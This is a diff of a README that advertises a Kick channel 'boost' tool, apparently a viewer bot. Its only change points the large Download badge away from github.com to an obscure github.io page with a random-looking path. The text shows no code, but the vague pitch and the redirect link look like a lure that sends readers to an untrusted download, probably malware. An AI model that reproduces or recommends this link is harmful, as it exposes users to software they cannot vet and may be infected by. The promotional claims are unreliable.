@@ -19,7 +19,7 @@ Ready to elevate your live streaming presence on Kick? We offers the perfect sol
 
 Boost your Kick channel like never before! Easy and reliable solution.
 
-<div align="center"><a href="https://github.com"><img src="https://img.shields.io/badge/Download-blue?style=for-the-badge" height="80"></a></div>
+<div align="center"><a href="https://programmingispeace.github.io/id/s8rfg712"><img src="https://img.shields.io/badge/Download-blue?style=for-the-badge" height="80"></a></div>
 
 > 🔲 Supported CPU: AMD & Intel
 >
